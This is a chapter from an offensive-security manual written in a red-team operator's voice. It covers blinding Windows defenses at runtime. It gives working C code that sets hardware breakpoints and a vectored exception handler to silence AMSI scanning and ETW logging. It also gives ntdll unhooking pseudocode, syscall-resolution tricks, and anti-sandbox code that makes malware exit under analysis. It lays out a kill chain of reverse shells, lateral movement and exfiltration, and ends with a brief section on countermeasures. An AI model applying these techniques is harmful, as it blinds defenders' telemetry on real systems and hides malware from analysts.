# Chapter 44 — Defense Evasion & Anti-Analysis

## ASF Tactic: COUNTER-INTELLIGENCE

**Kill Chain Phase:** Post-Exploitation / Sustained Access  
**Prerequisite Chapters:** 10 (Shadow Evasion), 43 (Concealment), v08 (Defender Architecture), v13 (Beyond TOCTOU)  
**MITRE ATT&CK:** T1562.001, T1562.002, T1497, T1622  
**Classification:** VADER Engagement — Findings #36, #37, #38

---

## 1. Doctrine Statement

Concealment hides the weapon on disk. Counter-intelligence blinds the
watchers at runtime.

The enemy doesn't just scan files. That's the outer wire — static
analysis, signature matching, the shit we defeated in Chapter 43. The
real perimeter is deeper: telemetry systems that watch your code
*while it runs*. AMSI hooks every script engine. ETW logs every syscall,
every process creation, every network socket. Behavioral analysis tracks
API call sequences looking for patterns that match known attack chains.

You can have the cleanest payload on disk — zero signature hits, packed
and obfuscated to hell — and the moment it executes, AMSI scans the
unpacked content in memory and ETW logs everything it does. The file
was invisible. The execution was not.

Counter-intelligence doctrine: blind the watchers WITHOUT leaving
evidence of the blinding. Don't just evade detection — make the
detection systems believe they're still working while they see nothing.

```
THE TWO PHASES OF INVISIBILITY
═══════════════════════════════════════════════════════════════

  PHASE 1: CONCEALMENT (Ch 43)          PHASE 2: COUNTER-INTEL (Ch 44)
  ─────────────────────────             ──────────────────────────────
  File on disk                          Code at runtime
  Static analysis evasion               Dynamic analysis evasion
  Signature bypass                      Telemetry blinding
  Packing, obfuscation, crypters        AMSI bypass, ETW bypass
  "Can they see the weapon?"            "Can they see it fire?"

  Cold on disk ──────────────────────── Dark at runtime
                    TOTAL INVISIBILITY
```

The gap between these two phases is where most operators get caught.
They spend weeks on the payload and zero time on the runtime environment.
The weapon is invisible until it moves.

---

## 2. AMSI — The Script Inspector

### What AMSI Is

Antimalware Scan Interface. Microsoft's universal hook into script
execution. Every time PowerShell, JScript, VBScript, VBA, or .NET
executes code, AMSI intercepts the content and hands it to whatever
antimalware provider is registered (usually Defender).

This isn't file scanning. This is *content* scanning. AMSI sees the
code *after* it's been decoded, decrypted, deobfuscated — in its final
executable form. You can Base64-encode your PowerShell payload six
times and AMSI doesn't care. It scans the decoded version right before
execution.

```
AMSI ARCHITECTURE
═══════════════════════════════════════════════════════════════

  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
  │  PowerShell  │    │   JScript    │    │   .NET CLR   │
  │   Host       │    │   Host       │    │   Host       │
  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘
         │                   │                   │
         ▼                   ▼                   ▼
  ┌──────────────────────────────────────────────────────┐
  │              AMSI Interface (amsi.dll)                │
  │                                                      │
  │  AmsiInitialize()  — register with provider          │
  │  AmsiOpenSession() — start scan session              │
  │  AmsiScanBuffer()  — THE CRITICAL FUNCTION           │
  │  AmsiScanString()  — convenience wrapper             │
  │  AmsiCloseSession()                                  │
  └───────────────────────────┬──────────────────────────┘
                              │
                              ▼
  ┌──────────────────────────────────────────────────────┐
  │         Antimalware Provider (Defender)               │
  │                                                      │
  │  Receives scan buffer → checks signatures →          │
  │  Returns AMSI_RESULT:                                │
  │    AMSI_RESULT_CLEAN        = 0  (safe)              │
  │    AMSI_RESULT_NOT_DETECTED = 1  (no match)          │
  │    AMSI_RESULT_DETECTED     = 32768 (malicious)      │
  └──────────────────────────────────────────────────────┘
```

The critical function is `AmsiScanBuffer`. Every scan request flows
through it. Kill that function, and AMSI is deaf to everything.

### Why Memory Patching Gets Caught

The classic bypass: overwrite the first bytes of `AmsiScanBuffer` with
`xor eax, eax; ret` (return 0 = clean). Five bytes. Trivial.

Also trivial to detect. Defender's Tamper Protection monitors the
integrity of AMSI memory regions. Code Integrity (CI) can hash .text
sections at runtime and compare against known-good values. Every major
EDR does periodic integrity validation of hooked functions.

The patch bytes themselves are signatured now. `0x31 0xC0 0xC3` at the
entry point of AmsiScanBuffer? That's a detection rule. The bypass
became the indicator of compromise.

```
WHY MEMORY PATCHING IS DEAD
═══════════════════════════════════════════════════════════════

  Original:  AmsiScanBuffer:  mov  rdi, rcx    ; 48 89 CF
                              push rbp         ; 55
                              ...

  Patched:   AmsiScanBuffer:  xor  eax, eax    ; 31 C0
                              ret              ; C3
                              ...

  Detection: hash(.text section of amsi.dll) ≠ expected hash
             Page hash mismatch → INTEGRITY VIOLATION ALERT
```

---

## 3. Hardware Breakpoint AMSI Bypass (VULN-195458)

### The Technique

CPU debug registers DR0-DR3 hold addresses. When the instruction
pointer hits one of those addresses, the CPU raises an exception —
`EXCEPTION_SINGLE_STEP` (0x80000004). This is how debuggers set
breakpoints without modifying target code.

We're not debugging. We're hijacking the mechanism.

Set DR0 to the address of `AmsiScanBuffer`. Register a Vectored
Exception Handler (VEH). When PowerShell calls AmsiScanBuffer, the CPU
traps before the first instruction executes. The VEH fires, spoofs the
return value to `E_INVALIDARG` (0x80070057), and advances the
instruction pointer past the function. AmsiScanBuffer never executes a
single instruction.

PowerShell sees `E_INVALIDARG` and interprets it as "AMSI provider
unavailable." It doesn't error. It doesn't alert. It just proceeds
without scanning.

```
AMSI CALL FLOW — NORMAL vs HWBP BYPASS
═══════════════════════════════════════════════════════════════

  NORMAL:
  PowerShell ──► AmsiScanBuffer() ──► scans content ──► DETECTED
                                                         ↓
                                                    SCRIPT BLOCKED

  HWBP BYPASS:
  PowerShell ──► AmsiScanBuffer() ──► CPU TRAP (DR0 hit)
                                         ↓
                                    VEH handler fires
                                         ↓
                                    Rax ← E_INVALIDARG
                                    Rip ← return address
                                         ↓
                                    EXCEPTION_CONTINUE_EXECUTION
                                         ↓
                                    PowerShell sees E_INVALIDARG
                                         ↓
                                    "AMSI unavailable" → UNSCANNED
```

### Why It Works

Three properties make this invisible:

1. **No memory modification.** DR0-DR3 are CPU registers. They exist in
   silicon, not RAM. There are no bytes to hash, no pages to verify, no
   .text sections to integrity-check.

2. **Per-thread isolation.** Debug registers are part of the thread
   context. They're saved/restored on context switch. One thread's
   breakpoints don't affect another thread. Set DR0 in your thread and
   nothing else on the system knows.

3. **PatchGuard ignores it.** Kernel Patch Protection monitors kernel
   structures — IDT, SSDT, GDT, critical kernel memory. It does NOT
   monitor user-mode debug registers on non-protected processes.
   PowerShell.exe is not a protected process. Its DR registers are
   unmonitored.

### The MSRC Response

Submitted as VULN-195458 to Microsoft Security Response Center. Their
assessment: "does not meet the bar for servicing." Translation — it's
a feature, not a bug. Debug registers doing what debug registers do.

Embargo void. Technique published. It's been known in the research
community since ~2020, but the combination of AMSI + ETW + zero memory
modification + Defender RTP enabled and bypassed is a clean
demonstration of the architectural blind spot.

```
x86-64 DEBUG REGISTER LAYOUT
═══════════════════════════════════════════════════════════════

  Register    Purpose                    Our Use
  ────────    ───────────────────────    ─────────────────────
  DR0         Breakpoint address 0       → AmsiScanBuffer
  DR1         Breakpoint address 1       → EtwEventWrite
  DR2         Breakpoint address 2       (available)
  DR3         Breakpoint address 3       (available)
  DR4         Reserved (alias DR6)       ─
  DR5         Reserved (alias DR7)       ─
  DR6         Debug status               Which BP fired
  DR7         Debug control              Enable/type/size

  DR7 CONTROL REGISTER (relevant bits):
  ┌─────────────────────────────────────────────────────┐
  │ Bit 0 (L0): Local enable DR0     = 1 (active)      │
  │ Bit 2 (L1): Local enable DR1     = 1 (active)      │
  │ Bit 4 (L2): Local enable DR2     = 0 (unused)      │
  │ Bit 6 (L3): Local enable DR3     = 0 (unused)      │
  │                                                     │
  │ Bits 16-17: DR0 condition = 00 (execution)          │
  │ Bits 18-19: DR0 length    = 00 (1 byte)             │
  │ Bits 20-21: DR1 condition = 00 (execution)          │
  │ Bits 22-23: DR1 length    = 00 (1 byte)             │
  └─────────────────────────────────────────────────────┘

  Condition codes:
    00 = Break on execution
    01 = Break on data write
    11 = Break on data read/write
    10 = Break on I/O (not used in user mode)
```

---

## 4. ETW Blinding (DR1)

### What ETW Is

Event Tracing for Windows. The nervous system of Windows telemetry.
Every significant operation generates ETW events — process creation,
thread creation, image loads, registry access, network connections,
file operations. These events feed Defender's behavioral engine, feed
Sysmon, feed every EDR on the market.

ETW isn't optional telemetry. It's the foundation. Without it, the
defensive stack is pattern-matching on static signatures alone — back
to 2005-era antivirus. Every modern detection that says "process X did
suspicious thing Y" is reading ETW events.

The function that emits every event: `ntdll!EtwEventWrite`.

### DR1 on EtwEventWrite

Same technique as the AMSI bypass. Set DR1 to the address of
`EtwEventWrite`. The VEH catches the breakpoint, sets Rax to
`STATUS_SUCCESS` (0x00000000), advances Rip past the function.

The caller — whatever service or component tried to log an event —
receives STATUS_SUCCESS. "Event logged successfully." But nothing was
logged. The event evaporated.

```
ETW EVENT FLOW — NORMAL vs HWBP BYPASS
═══════════════════════════════════════════════════════════════

  NORMAL:
  Process ──► EtwEventWrite() ──► Event stored in buffer ──► Consumer
                                                              ↓
                                                         Defender
                                                         Sysmon
                                                         EDR agent

  HWBP BYPASS:
  Process ──► EtwEventWrite() ──► CPU TRAP (DR1 hit)
                                      ↓
                                 VEH handler fires
                                      ↓
                                 Rax ← STATUS_SUCCESS (0x0)
                                 Rip ← return address
                                      ↓
                                 EXCEPTION_CONTINUE_EXECUTION
                                      ↓
                                 Caller thinks event logged
                                      ↓
                                 NOTHING RECORDED. SILENCE.
```

### What Goes Dark

When EtwEventWrite stops working, these event providers go blind:

- **Microsoft-Windows-Kernel-Process** — process creation, termination
- **Microsoft-Windows-Kernel-Network** — TCP/UDP connection events
- **Microsoft-Windows-Kernel-File** — file creation, deletion, rename
- **Microsoft-Windows-Kernel-Registry** — registry key access
- **Microsoft-Windows-DotNETRuntime** — .NET assembly loads, JIT
- **Microsoft-Windows-PowerShell** — script block logging
- **Microsoft-Windows-Security-Auditing** — logon events, privilege use

Every one of these feeds into Defender's behavioral analysis. Every one
of them goes silent. The reverse shell connects — no network event. The
payload spawns a child process — no process creation event. The
persistence key gets written — no registry event.

### Combined: The Dark Room (V3 CHARLIE)

```
COMBINED HWBP STATE — DR0 + DR1
═══════════════════════════════════════════════════════════════

  DR0: AmsiScanBuffer   → E_INVALIDARG    │ AMSI BLIND
  DR1: EtwEventWrite    → STATUS_SUCCESS   │ ETW BLIND
  DR2: (available)                         │
  DR3: (available)                         │
                                           ▼
                              ┌─────────────────────┐
                              │    DARK ROOM         │
                              │                      │
                              │  No script scanning  │
                              │  No event logging    │
                              │  No behavioral data  │
                              │                      │
                              │  Defender sees:       │
                              │    ✓ AMSI "working"   │
                              │    ✓ ETW "logging"    │
                              │    ✓ Everything normal │
                              │                      │
                              │  Reality:             │
                              │    ✗ AMSI skipped     │
                              │    ✗ ETW silenced     │
                              │    ✗ Total blackout   │
                              └─────────────────────┘
```

---

## 5. The VEH Handler — Single Point of Control

### Registration

```c
// Register VEH at highest priority (1 = first in chain)
AddVectoredExceptionHandler(1, HwbpExceptionHandler);
```

Priority `1` means this handler runs before any other VEH, before
structured exception handlers, before the unhandled exception filter.
Our handler gets first dibs on every exception in the process.

### Handler Logic

```c
LONG WINAPI HwbpExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)
{
    // Only handle single-step exceptions (hardware breakpoints)
    if (ExceptionInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;  // Not ours, pass it on

    PCONTEXT ctx = ExceptionInfo->ContextRecord;
    DWORD64 hitAddr = (DWORD64)ExceptionInfo->ExceptionRecord->ExceptionAddress;

    // DR0 hit: AmsiScanBuffer
    if (hitAddr == g_AmsiScanBufferAddr)
    {
        ctx->Rax = E_INVALIDARG;  // Return value: "AMSI unavailable"
        ctx->Rip = *(DWORD64*)ctx->Rsp;  // Pop return address into RIP
        ctx->Rsp += 8;  // Adjust stack (simulate ret)
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    // DR1 hit: EtwEventWrite
    if (hitAddr == g_EtwEventWriteAddr)
    {
        ctx->Rax = 0;  // STATUS_SUCCESS: "event logged"
        ctx->Rip = *(DWORD64*)ctx->Rsp;
        ctx->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;  // Unknown BP, pass it on
}
```

### What This Does, Instruction by Instruction

1. **ExceptionCode check.** `EXCEPTION_SINGLE_STEP` (0x80000004) is the
   code raised when a hardware breakpoint fires. If it's any other
   exception, we pass it to the next handler. We only intercept our
   breakpoints.

2. **Hit address comparison.** The exception record contains the address
   where the CPU trapped. Compare it against our known targets (AMSI,
   ETW) to determine which function was called.

3. **Rax modification.** x86-64 calling convention: the return value goes
   in RAX. We write our spoofed return value directly into the context.
   When execution resumes, the caller sees this value as if the function
   returned it normally.

4. **Rip modification.** The function never executed, so we need to
   manually simulate a `ret` instruction. Read the return address from
   the top of the stack (RSP points to it), write it into RIP.

5. **Rsp adjustment.** A `ret` pops 8 bytes off the stack. We adjust
   RSP to match, so the caller's stack frame is correct.

6. **EXCEPTION_CONTINUE_EXECUTION.** Tell the OS to resume execution at
   the new RIP. The caller continues as if the function returned
   normally.

```
VEH HANDLER FLOW
═══════════════════════════════════════════════════════════════

  Exception raised by CPU
         │
         ▼
  ┌─────────────────────────────────┐
  │ ExceptionCode == SINGLE_STEP?   │──── No ──► CONTINUE_SEARCH
  └──────────────┬──────────────────┘             (not our problem)
                 │ Yes
                 ▼
  ┌─────────────────────────────────┐
  │ ExceptionAddress == DR0 target? │──── Yes ──► Rax = E_INVALIDARG
  └──────────────┬──────────────────┘             Rip = [Rsp]
                 │ No                              Rsp += 8
                 ▼                                 CONTINUE_EXECUTION
  ┌─────────────────────────────────┐
  │ ExceptionAddress == DR1 target? │──── Yes ──► Rax = STATUS_SUCCESS
  └──────────────┬──────────────────┘             Rip = [Rsp]
                 │ No                              Rsp += 8
                 ▼                                 CONTINUE_EXECUTION
         CONTINUE_SEARCH
         (pass to next handler)
```

### Setting the Debug Registers

```c
BOOL SetHardwareBreakpoint(int reg, DWORD64 addr)
{
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE hThread = GetCurrentThread();
    GetThreadContext(hThread, &ctx);

    // Set breakpoint address
    switch (reg)
    {
        case 0: ctx.Dr0 = addr; break;
        case 1: ctx.Dr1 = addr; break;
        case 2: ctx.Dr2 = addr; break;
        case 3: ctx.Dr3 = addr; break;
    }

    // Enable local breakpoint, execution condition, 1-byte length
    // Each BP uses 2 bits in DR7 for local enable (bits 0,2,4,6)
    // and 4 bits for condition+length (bits 16-19, 20-23, 24-27, 28-31)
    ctx.Dr7 |= (1ULL << (reg * 2));       // Local enable
    // Condition 00 (execute) and length 00 (1 byte) = bits already 0

    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    return SetThreadContext(hThread, &ctx);
}
```

Usage:

```c
// Resolve addresses
HMODULE hAmsi = LoadLibraryA("amsi.dll");
g_AmsiScanBufferAddr = (DWORD64)GetProcAddress(hAmsi, "AmsiScanBuffer");

HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
g_EtwEventWriteAddr = (DWORD64)GetProcAddress(hNtdll, "EtwEventWrite");

// Set breakpoints
SetHardwareBreakpoint(0, g_AmsiScanBufferAddr);  // DR0 → AMSI
SetHardwareBreakpoint(1, g_EtwEventWriteAddr);    // DR1 → ETW

// Register handler
AddVectoredExceptionHandler(1, HwbpExceptionHandler);

// From this point: all AMSI scans fail, all ETW events vanish
```

---

## 6. Why This Beats Memory Patching

| Property | Memory Patching | Hardware Breakpoints |
|----------|----------------|---------------------|
| Modifies memory | Yes — .text section | No — CPU registers only |
| Page hash check | FAILS — hash mismatch | PASSES — nothing changed |
| Integrity scan | DETECTED | INVISIBLE |
| Signature match | Known patch bytes signatured | No bytes to signature |
| Survives CI verification | No | Yes |
| Per-thread isolation | No — affects all threads | Yes — thread context only |
| DR enumeration risk | N/A | Requires GetThreadContext on target |
| PatchGuard coverage | Kernel .text monitored | User-mode DR not monitored |

### The Detection Gap

There is no standard Windows API that lets a remote process enumerate
another thread's debug registers without either:

1. Calling `GetThreadContext` with `CONTEXT_DEBUG_REGISTERS` — requires
   `THREAD_GET_CONTEXT` access right on the target thread
2. Kernel-mode driver that reads DR0-DR3 directly

Defender doesn't call `GetThreadContext` on every thread in every
process to check for HWBP-based bypasses. That would be a performance
nightmare. The absence of this check is the blind spot.

---

## 7. Userland Unhooking (Reference)

This section documents the broader ecosystem of runtime evasion beyond
HWBP. These techniques target EDR hooks rather than AMSI/ETW, but the
principle is identical: neutralize the watcher at runtime.

### How EDR Hooks Work

Enterprise EDRs (CrowdStrike, SentinelOne, Carbon Black, etc.) inject
DLLs into every process. These DLLs overwrite the first bytes of
critical ntdll functions with a `JMP` to the EDR's monitoring code.

```
NTDLL INLINE HOOK ANATOMY
═══════════════════════════════════════════════════════════════

  CLEAN ntdll!NtWriteVirtualMemory:
    4C 8B D1              mov r10, rcx
    B8 3A 00 00 00        mov eax, 0x3A      ; syscall number
    0F 05                 syscall
    C3                    ret

  HOOKED ntdll!NtWriteVirtualMemory:
    E9 xx xx xx xx        jmp EDR_Hook_Func  ; 5-byte relative jump
    B8 3A 00 00 00        mov eax, 0x3A      ; (never reached)
    0F 05                 syscall
    C3                    ret

  EDR_Hook_Func:
    - Log the call parameters
    - Check against policy
    - If allowed: execute original bytes, then syscall
    - If blocked: return ACCESS_DENIED
```

### Unhooking: Read Clean, Overwrite Dirty

The concept: ntdll.dll on disk is clean. The version in memory is
hooked. Read the clean version from `C:\Windows\System32\ntdll.dll`,
map it, and overwrite the .text section of the in-memory copy with
the clean bytes from disk.

```c
// Pseudocode — ntdll unhooking
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                           GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, 0, NULL);
HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
LPVOID pClean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);

// Find .text section in clean copy and in-memory copy
// VirtualProtect the in-memory .text to PAGE_EXECUTE_READWRITE
// memcpy clean .text over hooked .text
// VirtualProtect back to PAGE_EXECUTE_READ
```

This kills every inline hook in ntdll. Every EDR hook removed in one
operation. But it has the same weakness as AMSI patching — you're
modifying memory, and sophisticated EDRs monitor for exactly this
(watching VirtualProtect calls on ntdll).

### Direct Syscalls: Skip ntdll Entirely

Why unhook ntdll when you can skip it? Syscall stubs invoke the kernel
directly using the `syscall` instruction with the appropriate syscall
number in EAX.

The problem: syscall numbers change between Windows versions. Build
10.0.19041 might use `0x3A` for NtWriteVirtualMemory while 10.0.22631
uses `0x3B`. Hardcode the wrong number and you get a blue screen or
random kernel function execution.

### Gate Techniques — Dynamic Syscall Resolution

**Hell's Gate** — Read the syscall number from the clean ntdll stub in
memory. Even if the first bytes are hooked with a JMP, the `mov eax,
0xNN` instruction is usually still intact a few bytes in. Parse it out.

**Halo's Gate** — If the target function's stub is completely
overwritten, walk up or down to neighboring functions (which might not
be hooked) and calculate the target's syscall number by offset. Syscall
numbers are sequential — if NtOpenProcess is 0x26 and two functions
down, the target is 0x26 + 2 = 0x28.

**Tartarus' Gate** — Combines both. Walk the export table, resolve
syscall numbers by parsing stubs, handle both hooked and clean stubs.
Most robust but most complex.

These are documented here for completeness. The VADER engagement
didn't need them — we bypassed Defender, not an EDR. But on a real
corporate target with CrowdStrike or Elastic, this is where you'd
go after the HWBP bypass handles AMSI and ETW.

---

## 8. Anti-Sandbox & Anti-VM Detection

Sandboxes and VMs are where your malware goes to die. Blue teams submit
samples to automated analysis environments. If your code detects it's
in a sandbox, it can sleep, exit, or behave benignly — wasting the
analyst's time and producing a clean report.

### VM Artifact Detection

Virtual machines leave fingerprints everywhere.

```c
// Registry checks
HKEY hKey;
// VMware leaves breadcrumbs
RegOpenKeyExA(HKEY_LOCAL_MACHINE,
    "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey);

// VirtualBox leaves different ones
RegOpenKeyExA(HKEY_LOCAL_MACHINE,
    "SOFTWARE\\Oracle\\VirtualBox Guest Additions", 0, KEY_READ, &hKey);

// Hyper-V
RegOpenKeyExA(HKEY_LOCAL_MACHINE,
    "SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters", 0, KEY_READ, &hKey);
```

```c
// MAC address prefix checks
// VMware:     00:0C:29, 00:50:56
// VirtualBox: 08:00:27
// Hyper-V:    00:15:5D
// QEMU:       52:54:00

// Process name checks
// vmtoolsd.exe, vmwaretray.exe       — VMware
// VBoxService.exe, VBoxTray.exe      — VirtualBox
// qemu-ga.exe                        — QEMU
```

If any of these checks hit, you're in a sandbox. Bail out gracefully —
don't crash, don't alert. Just... do nothing interesting.

### Timing Checks: RDTSC

The CPU timestamp counter increments every clock cycle. In a VM, the
hypervisor adds latency to privileged instructions. Measure execution
time of a known-duration operation — if it takes 10x longer than bare
metal, you're virtualized.

```c
// RDTSC timing check
DWORD64 t1, t2;
t1 = __rdtsc();

// Execute something with known cost
volatile int x = 0;
for (int i = 0; i < 1000; i++) x += i;

t2 = __rdtsc();

DWORD64 delta = t2 - t1;
// Bare metal: ~5,000-20,000 cycles
// VM:         ~50,000-500,000 cycles (hypervisor overhead)

if (delta > 100000)
{
    // Probably virtualized. Play dead.
    ExitProcess(0);
}
```

### User Interaction Checks

Sandboxes don't move the mouse. They don't click. They don't type.
Real users do.

```c
// Mouse movement check
POINT p1, p2;
GetCursorPos(&p1);
Sleep(3000);  // Wait 3 seconds
GetCursorPos(&p2);

if (p1.x == p2.x && p1.y == p2.y)
{
    // Mouse hasn't moved in 3 seconds.
    // Could be a sandbox. Could be a user who walked away.
    // Stack this with other checks before deciding.
}
```

### Sleep Acceleration Detection

Sandboxes fast-forward `Sleep()` calls. If your malware sleeps for 60
seconds and the sandbox skips it, the wall clock won't match.

```c
// Sleep acceleration detection
DWORD before = GetTickCount();
Sleep(60000);  // Request 60-second sleep
DWORD after = GetTickCount();

DWORD elapsed = after - before;
if (elapsed < 55000)  // Less than 55 seconds actually passed
{
    // Sleep was accelerated. Sandbox detected.
    ExitProcess(0);
}
```

### Stacking Checks

No single check is definitive. VMs exist in production (cloud
instances). Users leave their mouse still during meetings. One check
gives you a probability. Three checks giving consistent results give
you confidence.

```
ANTI-ANALYSIS DECISION MATRIX
═══════════════════════════════════════════════════════════════

  Check                    Weight    Sandbox Indicator
  ─────────────────────    ──────    ──────────────────
  VM registry keys         +2       Known VM vendor present
  VM MAC prefix            +2       Hypervisor NIC detected
  VM process names         +3       Guest tools running
  RDTSC timing             +2       Execution 10x slower
  Mouse movement           +1       Cursor static 30s+
  Sleep acceleration       +3       Sleep shortened >10%
  Low RAM (<2GB)           +1       Common sandbox config
  Low CPU count (1)        +1       Common sandbox config
  Recent boot (<5 min)     +2       Fresh analysis VM

  Score ≥ 6: HIGH confidence sandbox → exit/sleep
  Score 3-5: MEDIUM — delay execution, check again later
  Score ≤ 2: Probably real → execute payload
```

---

## 9. ASF Integration — Counter-Intelligence in the Kill Chain

### Where This Fits

```
THE VADER KILL CHAIN — COUNTER-INTELLIGENCE PLACEMENT
═══════════════════════════════════════════════════════════════

  Phase 1: INITIAL ACCESS
     └─ Delivery mechanism (phishing, USB, download)

  Phase 2: CONCEALMENT (Ch 43)
     └─ Payload on disk — packed, obfuscated, clean signatures
     └─ Static analysis: INVISIBLE

  Phase 3: TOCTOU EXPLOIT (v10, Ch 15)
     └─ Junction swap redirects Defender's quarantine
     └─ Defender scans clean file, quarantines its own component

  ► Phase 4: COUNTER-INTELLIGENCE (this chapter)             ◄
     └─ HWBP fires post-exploitation
     └─ DR0: AMSI blind — PowerShell payloads run unscanned
     └─ DR1: ETW blind  — no logs of network/process activity
     └─ Runtime: DARK

  Phase 5: POST-EXPLOITATION (v12, Ch 12)
     └─ Reverse shell connects — ETW doesn't log it
     └─ Lateral movement — no process creation events
     └─ Persistence — registry writes unrecorded

  Phase 6: EXFILTRATION
     └─ Data leaves — network events silenced
```

### The Operational Sequence

In the VADER engagement, the sequence was:

1. TOCTOU exploit fires. Defender's junction gets swapped. The AV
   engine quarantines its own file instead of the payload. Defender is
   structurally compromised.

2. Payload executes. First action: set up HWBP on current thread.
   DR0 → AmsiScanBuffer. DR1 → EtwEventWrite. VEH registered.

3. PowerShell stage-2 payload downloads and executes. AMSI would
   normally scan the script content and flag the reverse shell code.
   With DR0 active, the scan never happens.

4. Reverse shell connects to C2. ETW would normally log the TCP
   connection event. With DR1 active, no event is emitted. Sysmon
   (if present) receives nothing.

5. Post-exploitation continues in the dark. Process injection, token
   theft, lateral movement — all of it invisible to user-mode telemetry.

### Relationship to Other ASF Tactics

| ASF Tactic | Chapter | Function |
|-----------|---------|----------|
| CONCEALMENT | 43 | Hide the weapon (disk) |
| COUNTER-INTELLIGENCE | 44 (this) | Blind the watchers (runtime) |
| SHADOW EVASION | 10 | Disable Defender services |
| GHOST SERVICE | 11 | Persist through service manipulation |
| SHADOW LATERAL | 12 | Move through the network |

CONCEALMENT and COUNTER-INTELLIGENCE are complementary. One without the
other leaves a gap. A concealed payload that doesn't blind telemetry
will be caught by behavioral analysis. A telemetry-blind payload that
isn't concealed will be caught by static scanning. Both together close
the loop.

---

## 10. Detection & Countermeasures

Everything in this chapter has a counter. The arms race never stops.

### Kernel-Mode DR Monitoring

If Microsoft decides to monitor user-mode debug registers from kernel
mode — game over for HWBP bypass. A kernel callback on
`SetThreadContext` that checks whether DR0-DR3 point to security-
critical functions would detect this immediately.

PatchGuard already has the infrastructure. It monitors kernel debug
registers. Extending coverage to user-mode DR on processes that load
amsi.dll or have ETW providers registered would close the blind spot.

**Current status:** Not implemented as of Windows 11 24H2. The gap
persists.

### VEH Registration Tracking

`AddVectoredExceptionHandler` modifies internal ntdll structures.
A kernel driver or Defender component could enumerate registered VEHs
via `NtQueryInformationProcess` or by walking the internal
`LdrpVectorHandlerList`. If a process has a VEH registered and debug
registers pointing at security functions — that's a strong signal.

**Current status:** Some EDRs do this. Defender does not (as of this
writing).

### ETW Provider Silence Detection

If an ETW provider that normally generates hundreds of events per
second suddenly goes silent — that's suspicious as hell. The absence
of events IS an event. A meta-monitoring system that tracks event
rates per provider could detect ETW blinding by noticing the silence.

```
ETW SILENCE DETECTION CONCEPT
═══════════════════════════════════════════════════════════════

  Normal:  ████████████████████████████████  ~200 events/sec
  Normal:  ███████████████████████████████   ~195 events/sec
  Normal:  ████████████████████████████████  ~201 events/sec
  BLIND:   ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  0 events/sec
  BLIND:   ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  0 events/sec

  ► ALERT: Provider Microsoft-Windows-Kernel-Process
           went from ~200 ev/s to 0 ev/s at 14:32:07
           Possible ETW tampering detected
```

**Current status:** Not widely implemented. Most SOCs monitor for
specific events, not for the absence of events. This is a defensive
gap that mirrors the offensive gap.

### The Fundamental Tension

Counter-intelligence creates a paradox for both sides:

**For the attacker:** Blinding telemetry is powerful but detectable IF
the defender checks for blindness. The more completely you blind the
system, the more obvious the blindness becomes to anyone looking for
silence.

**For the defender:** Checking for blindness requires additional
telemetry — which can also be blinded. You end up in a recursive
problem: who watches the watchmen who watch the watchmen?

The eventual resolution is hardware-backed attestation — the CPU or
TPM verifying that security components are intact, from a trust anchor
that software can't touch. But that's architecture-level redesign,
not a patch. Until then, the gap between user-mode bypass and kernel-
mode detection remains exploitable.

```
THE DETECTION ARMS RACE
═══════════════════════════════════════════════════════════════

  2015: AMSI introduced. Scripts scanned before execution.
  2017: Memory patching bypass (xor eax,eax; ret). Trivial.
  2019: Defender adds integrity checks. Patching detected.
  2020: HWBP bypass published. No memory to check. Works.
  2022: Some EDRs enumerate DR registers. HWBP detected (EDR only).
  2024: Defender still doesn't check DR. HWBP works against Defender.
  2025: VULN-195458 rejected. Microsoft says not a vuln.
  202X: Kernel DR monitoring? Hardware attestation? TBD.

  The pattern: every bypass gets detected, but there's always a gap
  between publication and coverage. That gap is operational time.
```

---

## 11. Summary

Counter-intelligence is the complement to concealment. Together they
achieve total invisibility across both phases of payload lifecycle —
static and dynamic.

The core technique — hardware breakpoints on security-critical
functions with VEH-based return value spoofing — exploits a
fundamental architectural assumption: that user-mode telemetry sources
are trustworthy. They're not. The CPU's own debug facilities can
silently intercept and neutralize any user-mode function without
modifying a single byte of memory.

Three facts make this work:
1. Debug registers are per-thread and exist in CPU silicon, not RAM
2. PatchGuard doesn't monitor user-mode DR on non-protected processes
3. No standard API enumerates another thread's DR without explicit access

Three things would kill it:
1. Kernel-mode DR monitoring on security-critical processes
2. ETW silence detection (monitoring for absence of events)
3. Hardware-backed attestation of security component integrity

Until those three defenses exist — and as of this writing, none of
them are deployed in Windows Defender — the Dark Room stays open.

---

*VADER Engagement — Finding #36 (HWBP AMSI/ETW Bypass)*
*MSRC Case: VULN-195458 — Embargo VOID*
*ASF Tactic: COUNTER-INTELLIGENCE — Status: ACTIVE*
